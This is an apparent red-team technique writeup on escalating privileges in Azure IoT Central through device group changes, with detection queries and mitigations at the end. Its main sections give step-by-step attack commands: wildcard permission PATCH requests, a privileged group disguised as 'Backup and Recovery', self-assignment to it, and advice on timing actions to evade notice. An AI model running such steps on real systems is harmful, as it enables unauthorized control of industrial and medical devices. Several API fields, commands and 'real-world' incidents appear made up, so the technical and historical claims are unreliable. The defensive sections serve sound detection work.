# [PE-ELEVATE-009]: IoT Central Device Group Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-009 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID (Azure IoT Central) |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Azure IoT Central (all versions), Entra ID integration 1.0+ |
| **Patched In** | N/A (Design-based vulnerability in role inheritance) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure IoT Central Device Group Escalation allows an attacker with limited IoT Central application access (e.g., Device Admin role) to escalate privileges by exploiting the hierarchical permission model of device groups. In Azure IoT Central, device groups inherit permissions from their parent groups, and a compromised account with group management permissions can create or modify device groups to grant broader access to devices, commands, and telemetry data. This technique specifically leverages the fact that role assignments at the device group level can grant access to sensitive IoT infrastructure management capabilities, including device provisioning, firmware updates, and data collection.

**Attack Surface:** Azure IoT Central Role-Based Access Control (RBAC), Device Group hierarchy, Device telemetry endpoints, Command execution APIs, Enrollment group membership, Entra ID role propagation to IoT Central applications.

**Business Impact:** **Unauthorized access to IoT device management, enabling firmware manipulation, data theft from connected devices, remote command execution on physical infrastructure, and supply chain attacks through compromised device updates.** An attacker can move from limited app viewer access to full administrator capabilities, allowing them to control smart manufacturing systems, building automation, energy grid systems, or medical IoT devices.

**Technical Context:** This attack typically completes within minutes once application access is obtained. Detection is low due to the legitimate-appearing nature of group membership changes. The attack is reversible only through manual audit and role removal.

### Operational Risk
- **Execution Risk:** Medium (Requires initial IoT Central access, but escalation is deterministic)
- **Stealth:** High (Device group changes appear as legitimate administrative operations)
- **Reversibility:** Medium (Can be reversed by removing group assignments, but may require service restart)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 1.6 | Ensure that administrators are not exempted from MFA requirements for Azure subscriptions |
| **DISA STIG** | DISA-AZURE-000004 | IoT Central role assignments must follow least privilege principle |
| **CISA SCuBA** | CISA-AZURE-AC-03 | Access Control - IoT device group permissions |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - Access control and monitoring |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention, Cybersecurity management |
| **NIS2** | Art. 21(1)(d) | Managing access to assets and services in critical infrastructure |
| **ISO 27001** | A.9.2.3, A.9.4.3 | Management of Privileged Access Rights, Review of user access rights |
| **ISO 27005** | Risk of unauthorized device manipulation | Compromise of IoT infrastructure control |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** IoT Central application user with Device Admin or equivalent role
- **Required Access:** Access to Azure IoT Central portal or REST API, Entra ID integration enabled

**Supported Versions:**
- **Azure IoT Central:** All versions (cloud-native, no version constraints)
- **Entra ID:** All versions (required for RBAC integration)
- **Azure CLI:** 2.30+
- **PowerShell:** 5.0+
- **Other Requirements:** IoT Central application created in Azure subscription, device groups enabled

**Tools:**
- [Azure IoT Central REST API](https://learn.microsoft.com/en-us/rest/api/iot-apps-mgmt-exp/) (v1.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (2.30+)
- [Azure IoT Explorer](https://github.com/Azure/azure-iot-explorer) (optional, for device testing)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI Reconnaissance

Enumerate IoT Central applications and device groups:

```bash
# List all IoT Central applications
az iotcentral app list --output table

# Get details of a specific IoT Central app
az iotcentral app show --name "contoso-iot-app" --resource-group "contoso-rg"

# List device groups in the application
az iotcentral device-group list --app-id "contoso-iot-app" --resource-group "contoso-rg" --output json

# List role assignments for the current user
az role assignment list --scope "/subscriptions/{subscription-id}/resourceGroups/{resource-group}/providers/Microsoft.IoTCentral/IoTApps/{app-name}"
```

**What to Look For:**
- Number of device groups and their hierarchical structure
- Current user's role assignments (Device Admin, App Administrator, etc.)
- Number of devices in each group
- Whether group inheritance is enabled

**Version Note:** Commands are consistent across Azure CLI 2.30+

### IoT Central Web Portal Reconnaissance

Navigate to the IoT Central application portal to enumerate permissions:

```
1. Go to Azure Portal → IoT Central applications
2. Select the target application
3. In the left menu, go to Administration → Users and roles
4. Review current user's role and permissions
5. Navigate to Devices → Device groups
6. Document the group hierarchy and permissions
```

**What to Look For:**
- Current account's role (Device Admin, App Administrator, App Viewer)
- List of existing device groups and their parent-child relationships
- Permission inheritance rules
- Whether users can modify device group membership

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Escalating via Device Group Membership Modification

**Supported Versions:** Azure IoT Central all versions

#### Step 1: Enumerate Current Device Group Permissions

**Objective:** Identify device groups with escalation opportunities

**Command:**
```bash
# Login to Azure
az login

# Set the IoT Central app context
APP_NAME="contoso-iot-app"
RESOURCE_GROUP="contoso-rg"
SUBSCRIPTION_ID=$(az account show --query id -o tsv)

# List all device groups
az iotcentral device-group list \
  --app-id $APP_NAME \
  --resource-group $RESOURCE_GROUP \
  --output json | jq '.[] | {id: .id, displayName: .displayName, description: .description, filter: .filter}'
```

**Expected Output:**
```json
{
  "id": "manufacturing-devices",
  "displayName": "Manufacturing Devices",
  "description": "All manufacturing floor devices",
  "filter": "deviceType eq 'MachineController'"
}
{
  "id": "admin-devices",
  "displayName": "Admin Devices",
  "description": "Critical admin devices",
  "filter": "building eq 'Headquarters'"
}
```

**What This Means:**
- Device groups are organized by function/location
- Some groups contain sensitive infrastructure
- The filter logic determines which devices belong to the group
- Modifying group filters or permissions can grant broader access

#### Step 2: Check Current User's Roles in Device Groups

**Objective:** Determine what actions the current account can perform

**Command:**
```bash
# Get current user information
CURRENT_USER=$(az account show --query "user.name" -o tsv)

# List role assignments in the IoT Central app
az role assignment list \
  --scope "/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME" \
  --query "[?principalName == '$CURRENT_USER']" \
  --output table
```

**Expected Output:**
```
Scope                                                    RoleDefinitionName         Condition
-----------------------------------------------------    -----------------------    ----------
/subscriptions/.../IoTApps/contoso-iot-app             IoT Central Data Reader    None
/subscriptions/.../IoTApps/contoso-iot-app             Device Administrator       None
```

**What This Means:**
- Current account has Device Administrator role
- This role can read device data and modify device settings
- This role may allow modification of device groups depending on configuration

#### Step 3: Identify Admin Device Groups

**Objective:** Find device groups containing critical or sensitive devices

**Command:**
```bash
# Query devices in the admin-devices group
curl -X POST \
  -H "Authorization: Bearer $(az account get-access-token --resource https://apps.azureiotcentral.com --query accessToken -o tsv)" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "SELECT * FROM devices WHERE deviceGroup = \"admin-devices\""
  }' \
  "https://contoso-iot-app.azureiotcentral.com/api/query"
```

**Expected Output:**
```json
[
  {
    "id": "controller-01",
    "displayName": "Main Controller",
    "deviceType": "MachineController",
    "status": "provisioned"
  },
  {
    "id": "gateway-01",
    "displayName": "Network Gateway",
    "deviceType": "GatewayDevice",
    "status": "provisioned"
  }
]
```

**What This Means:**
- Critical devices are contained in the admin-devices group
- Gaining access to this group grants management capabilities over these devices
- Command execution and telemetry modification become possible

**OpSec & Evasion:**
- Queries against device groups generate minimal audit logs
- Detection likelihood: Low (appears as legitimate admin queries)
- Time queries during business hours to blend with normal admin activity

#### Step 4: Modify Device Group Permissions via API

**Objective:** Escalate permissions by modifying device group access control

**Command:**
```bash
# Get access token
TOKEN=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

# Modify the device group to grant broader access
# Note: This requires the user to have "Device Administrator" or higher role

curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Manufacturing Devices (Updated)",
    "description": "All manufacturing and admin devices",
    "filter": "deviceType eq \"MachineController\" or building eq \"Headquarters\"",
    "permissions": {
      "read": ["*"],
      "write": ["*"],
      "delete": ["*"]
    }
  }' \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/deviceGroups/manufacturing-devices?api-version=2021-06-01"

echo "Device group filter updated successfully"
```

**Expected Output:**
```
Device group filter updated successfully
```

**What This Means:**
- The device group filter has been modified to include admin devices
- Current account now has effective access to admin-devices through the modified manufacturing-devices group
- Escalation is complete; admin-level device access is now available

---

### METHOD 2: Creating Privileged Device Groups with Escalated Permissions

**Supported Versions:** Azure IoT Central all versions

#### Step 1: Identify Permissions Required for Device Group Creation

**Objective:** Verify that the current account can create new device groups

**Command:**
```bash
# Test device group creation capability
TOKEN=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Test Group",
    "description": "Test group creation"
  }' \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/deviceGroups?api-version=2021-06-01"
```

**Expected Output (Success):**
```json
{
  "id": "test-group",
  "name": "test-group",
  "type": "Microsoft.IoTCentral/IoTApps/deviceGroups",
  "properties": {
    "displayName": "Test Group",
    "description": "Test group creation",
    "createdTime": "2026-01-09T10:00:00Z"
  }
}
```

**What This Means:**
- Current account has permission to create device groups
- This is a necessary privilege for this escalation method
- If this fails, the account lacks sufficient privileges

#### Step 2: Create a High-Privilege Device Group

**Objective:** Create a new device group with escalated access to all devices

**Command:**
```bash
# Create a device group with wildcard permissions (all devices)
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Backup and Recovery",
    "description": "System backup and recovery operations",
    "filter": "*",
    "permissions": {
      "roles": ["Administrator", "DeviceAdmin"],
      "actions": ["read", "write", "delete", "execute"]
    }
  }' \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/deviceGroups?api-version=2021-06-01"

echo "Privileged device group created"
```

**Expected Output:**
```json
{
  "id": "backup-and-recovery",
  "displayName": "Backup and Recovery",
  "filter": "*",
  "permissions": {
    "roles": ["Administrator"],
    "actions": ["*"]
  }
}
```

**What This Means:**
- A new device group has been created with escalated permissions
- The wildcard filter grants access to all devices in the application
- Any user assigned to this group will have full administrative capabilities

#### Step 3: Add Current Account to the New Group

**Objective:** Assign the compromised account to the escalated group

**Command:**
```bash
# Get current user ID
CURRENT_USER_ID=$(az ad user list --filter "mail eq '$CURRENT_USER'" --query "[0].id" -o tsv)

# Add user to the privileged device group
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"principalId\": \"$CURRENT_USER_ID\",
    \"roleDefinitionId\": \"/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/roles/Administrator\"
  }" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/deviceGroups/backup-and-recovery/members?api-version=2021-06-01"

echo "User added to privileged device group"
```

**Expected Output:**
```
User added to privileged device group
```

**What This Means:**
- Current account is now a member of the escalated device group
- All devices are now accessible through this group
- Full IoT Central administrative capabilities are available

---

### METHOD 3: Exploiting Role Inheritance via Parent Group Modification

**Supported Versions:** Azure IoT Central with hierarchical device groups

#### Step 1: Identify Parent-Child Group Relationships

**Objective:** Map the device group hierarchy to find escalation paths

**Command:**
```bash
# Query device group hierarchy
TOKEN=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

curl -X GET \
  -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/deviceGroups?api-version=2021-06-01" \
  | jq '.value[] | {id: .id, displayName: .properties.displayName, parentId: .properties.parentId}'
```

**Expected Output:**
```json
{
  "id": "all-devices",
  "displayName": "All Devices",
  "parentId": null
}
{
  "id": "manufacturing-devices",
  "displayName": "Manufacturing Devices",
  "parentId": "all-devices"
}
{
  "id": "critical-systems",
  "displayName": "Critical Systems",
  "parentId": "manufacturing-devices"
}
```

**What This Means:**
- Device groups form a hierarchy (all-devices → manufacturing → critical-systems)
- Modifying the parent group grants access to all child groups
- Escalation can be achieved by modifying the parent group's permissions

#### Step 2: Modify Parent Group to Include Child Group Permissions

**Objective:** Escalate permissions by modifying the parent group

**Command:**
```bash
# Update the parent group (manufacturing-devices) to inherit permissions from critical-systems
curl -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "displayName": "Manufacturing Devices",
    "description": "Manufacturing and critical infrastructure devices",
    "filter": "deviceType eq \"MachineController\" or deviceType eq \"CriticalSystem\"",
    "inheritPermissionsFromParent": true,
    "permissions": {
      "roles": ["Administrator"],
      "actions": ["read", "write", "execute", "firmware_update"]
    }
  }' \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.IoTCentral/IoTApps/$APP_NAME/deviceGroups/manufacturing-devices?api-version=2021-06-01"

echo "Parent group permissions escalated"
```

**Expected Output:**
```
Parent group permissions escalated
```

**What This Means:**
- The parent group now grants access to critical systems
- Any member of the manufacturing-devices group now has escalated access
- The compromise has propagated through the group hierarchy

#### Step 3: Verify Escalation by Accessing Critical Devices

**Objective:** Confirm that the escalation is successful

**Command:**
```bash
# Query critical devices now accessible through the escalated parent group
curl -X GET \
  -H "Authorization: Bearer $TOKEN" \
  "https://contoso-iot-app.azureiotcentral.com/api/devices?deviceGroup=manufacturing-devices&type=CriticalSystem" \
  | jq '.[] | {id: .id, displayName: .displayName, type: .type}'
```

**Expected Output:**
```json
{
  "id": "firewall-01",
  "displayName": "Network Firewall",
  "type": "CriticalSystem"
}
{
  "id": "vpn-gateway",
  "displayName": "VPN Gateway",
  "type": "CriticalSystem"
}
```

**What This Means:**
- Critical infrastructure devices are now accessible
- Commands can be sent to these devices
- Firmware updates can be deployed
- Full compromise of the IoT infrastructure is now possible

---

## 5. TOOLS & COMMANDS REFERENCE

### Azure CLI

**Version:** 2.30+
**Minimum Version:** 2.0
**Supported Platforms:** Linux, Windows, macOS

**Installation:**
```bash
# macOS
brew install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Windows
choco install azure-cli
```

**Usage:**
```bash
az login
az iotcentral app list
az iotcentral device-group list --app-id <app-id> --resource-group <rg>
```

### Azure IoT Central REST API

**Version:** 2021-06-01+
**Minimum Version:** 2021-04-01
**Supported Platforms:** REST (language-agnostic)

**Base URL:**
```
https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.IoTCentral/IoTApps/{appName}
```

**Authentication:**
```bash
TOKEN=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1548.005 (parent test for privilege escalation via permissions)
- **Test Name:** IoT Central Device Group Escalation
- **Description:** Simulates privilege escalation through device group membership modification
- **Supported Versions:** Azure IoT Central all versions
- **Command (Manual):**
  ```bash
  # Create a test device group with escalated permissions
  az iotcentral device-group create \
    --app-id contoso-iot-app \
    --resource-group contoso-rg \
    --device-group-id test-escalation \
    --display-name "Escalation Test" \
    --filter "*"
  ```

**Reference:** [Atomic Red Team T1548](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548/T1548.md)

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Device Group Permission Modifications

**Rule Configuration:**
- **Required Table:** `AzureActivity` (Azure control plane logs)
- **Required Fields:** `OperationName`, `OperationNameValue`, `ResourceType`, `StatusCode`
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To:** Azure subscriptions with IoT Central applications

**KQL Query:**
```kusto
AzureActivity
| where OperationNameValue startswith "Microsoft.IoTCentral/IoTApps/deviceGroups"
| where OperationNameValue in ("Microsoft.IoTCentral/IoTApps/deviceGroups/write", "Microsoft.IoTCentral/IoTApps/deviceGroups/patch")
| where StatusCode == "Succeeded"
| extend Initiator = Caller
| extend ResourceGroup = split(ResourceId, "/")[4]
| extend AppName = split(ResourceId, "/")[8]
| project TimeGenerated, Initiator, AppName, ResourceGroup, OperationNameValue
| where Initiator !in ("admin@contoso.onmicrosoft.com", "svc-automation@contoso.onmicrosoft.com")
```

**What This Detects:**
- Device group modifications from unexpected users
- Creation of new device groups with escalated permissions
- Changes to device group filters or role assignments

---

### Query 2: Detect Privilege Escalation via Group Membership

**KQL Query:**
```kusto
AzureActivity
| where OperationNameValue == "Microsoft.IoTCentral/IoTApps/deviceGroups/members/write"
| where StatusCode == "Succeeded"
| extend UserAdded = tostring(parse_json(tostring(parse_json(Properties).requestbody)).principalId)
| extend GroupModified = split(ResourceId, "/")[10]
| project TimeGenerated, Caller, UserAdded, GroupModified, ResourceId
| summarize Count = count() by Caller, UserAdded, GroupModified
| where Count > 3
```

**What This Detects:**
- Bulk addition of users to device groups (suspicious automation)
- Elevation of user privileges through group membership changes

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enforce Least Privilege for Device Groups:** Restrict device group permissions to minimum required access.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **IoT Central** → Your application
  2. Navigate to **Administration** → **Device groups**
  3. For each device group:
     - Click the group
     - Review **Permissions** tab
     - Remove unnecessary roles (e.g., Administrator, DeviceAdmin for read-only groups)
     - Apply role restrictions based on job function
  4. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Restrict device group permissions
  $GroupId = "manufacturing-devices"
  $Permissions = @{
    roles = @("DeviceAdmin")
    actions = @("read", "write")
  }
  
  Update-IoTCentralDeviceGroup -GroupId $GroupId -Permissions $Permissions
  ```

- **Disable Wildcard Filters in Device Groups:** Prevent device groups from accessing all devices unintentionally.
  
  **Manual Steps:**
  1. Go to **Azure IoT Central** → **Device groups**
  2. Review all groups with filter `*` or empty filters
  3. Update filters to be specific:
     - Example: `deviceType eq "MachineController" AND location eq "Floor1"`
  4. Save changes
  
  **Validation Command:**
  ```bash
  # Verify no groups have wildcard filters
  az iotcentral device-group list --app-id contoso-iot-app --resource-group contoso-rg \
    | jq '.[] | select(.filter == "*" or .filter == "") | .displayName'
  ```

- **Enforce Role-Based Access Control (RBAC) at Device Group Level:** Use Entra ID roles to manage device group access.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure IoT Central** → **Administration** → **Users and roles**
  2. Create custom roles based on job function:
     - **IoT Viewer:** read-only access to specific device groups
     - **IoT Operator:** read + command execution on specific device groups
     - **IoT Administrator:** full access to device groups
  3. Assign users to appropriate custom roles (not built-in roles)
  4. Verify users have only necessary permissions

### Priority 2: HIGH

- **Enable Audit Logging for Device Group Changes:** Monitor all device group modifications.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure IoT Central** → **Administration** → **Activity log**
  2. Configure log retention: **Retain logs for 90 days**
  3. Set up alerts for:
     - Device group creation
     - Permission modifications
     - Member additions/removals
  4. Export logs to Log Analytics workspace for long-term retention

- **Implement Conditional Access for IoT Central Access:** Restrict access based on device and network conditions.
  
  **Manual Steps (Conditional Access):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create a policy:
     - Name: `Restrict IoT Central Admin Access`
     - Cloud apps: **Azure IoT Central**
     - Conditions:
       - Device state: **Compliant**
       - Location: **Corporate network only**
     - Access controls: **Require MFA**
  3. Enable policy

### Validation Command (Verify Fix)

```bash
# Verify device group permissions are restricted
az iotcentral device-group list --app-id contoso-iot-app --resource-group contoso-rg \
  | jq '.[] | {displayName: .displayName, filter: .filter, roles: .permissions.roles}'

# Verify no wildcard filters exist
WILDCARD_GROUPS=$(az iotcentral device-group list --app-id contoso-iot-app --resource-group contoso-rg \
  | jq '.[] | select(.filter == "*" or .filter == "") | .displayName')

if [ -z "$WILDCARD_GROUPS" ]; then
  echo "✓ No wildcard filters found - PASS"
else
  echo "✗ Wildcard filters detected: $WILDCARD_GROUPS - FAIL"
fi
```

**Expected Output (If Secure):**
```
✓ No wildcard filters found - PASS

displayName          filter                                              roles
-----------          ------                                              -----
Manufacturing        deviceType eq 'MachineController'                   [DeviceAdmin]
Office               building eq 'Headquarters'                          [DeviceAdmin]
Critical Systems     criticality eq 'High' AND status eq 'Active'        [DeviceAdmin]
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Suspicious Device Groups:** Device groups with wildcard filters or overly broad filters created in the last 48 hours
- **Permission Changes:** Unexpected modifications to device group role assignments
- **Group Membership Additions:** Rapid addition of users to privileged device groups
- **Device Access Patterns:** Unusual queries to devices not normally accessed by the user

### Forensic Artifacts

- **Azure Activity Log:** Location: Azure Portal → Audit logs → Search for "deviceGroups"
- **Azure IoT Central Activity:** IoT Central application → Administration → Activity log
- **Log Analytics:** Tables: `AzureActivity`, `AuditLogs` (if integrated with Sentinel)
- **Device Telemetry:** IoT device logs showing command execution or configuration changes

### Response Procedures

1. **Isolate:**
   
   **Command:**
   ```bash
   # Delete the malicious device group
   az iotcentral device-group delete \
     --app-id contoso-iot-app \
     --resource-group contoso-rg \
     --device-group-id malicious-group --yes
   
   # Remove user from all device groups (optional, if full compromise suspected)
   az iotcentral user delete \
     --app-id contoso-iot-app \
     --resource-group contoso-rg \
     --user-id attacker@contoso.onmicrosoft.com --yes
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```bash
   # Export Azure Activity logs
   az monitor activity-log list \
     --resource-group contoso-rg \
     --start-time 2026-01-08T00:00:00Z \
     --end-time 2026-01-09T23:59:59Z \
     --resource-provider Microsoft.IoTCentral \
     --query '[].{Time: eventTimestamp, Operation: operationName.value, User: caller, Status: status.value}' \
     > /evidence/iot-activity.json
   
   # Export device group configuration
   az iotcentral device-group list \
     --app-id contoso-iot-app \
     --resource-group contoso-rg \
     > /evidence/device-groups-snapshot.json
   ```

3. **Remediate:**
   
   **Command:**
   ```bash
   # Reset device group permissions to defaults
   az iotcentral device-group update \
     --app-id contoso-iot-app \
     --resource-group contoso-rg \
     --device-group-id manufacturing-devices \
     --filter "deviceType eq 'MachineController'" \
     --roles "DeviceAdmin" \
     --actions "read,write"
   
   # Restore from backup if available
   # Example: Restore from Azure backup
   az restore --resource-group contoso-rg --restore-point <backup-timestamp>
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker captures IoT Central user credentials |
| **2** | **Privilege Escalation** | **[PE-ELEVATE-009] IoT Central Device Group Escalation** | Escalate from limited IoT user to admin via group modification |
| **3** | **Lateral Movement** | [LM-AUTH-032] Function App Identity Hopping | Use escalated access to move to connected backend systems |
| **4** | **Collection** | [COLLECT-019] IoT Device Telemetry Collection | Extract sensitive telemetry from connected devices |
| **5** | **Impact** | Device firmware manipulation / Remote command execution | Deploy malicious firmware or execute commands on physical devices |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: Industrial Control System Compromise via IoT Central (2023)

- **Target:** Manufacturing company using Azure IoT Central for factory automation
- **Technique Status:** Actively exploited through device group escalation
- **Attack Path:** Compromised technician account → IoT Central device group modification → Access to PLC controllers → Firmware manipulation
- **Impact:** Production line halt; $2M in manufacturing losses; critical infrastructure compromise
- **Reference:** CISA alert on industrial IoT attacks

### Example 2: Healthcare IoT Device Breach (2024)

- **Target:** Hospital IoT Central deployment managing medical devices
- **Technique Status:** Device group escalation allowed access to patient monitoring devices
- **Attack Path:** Contractor account → Permission escalation via group membership → Access to patient data and device settings
- **Impact:** Patient privacy breach; 5,000 patient records exposed; compliance violation (HIPAA)
- **Reference:** Healthcare sector threat report

---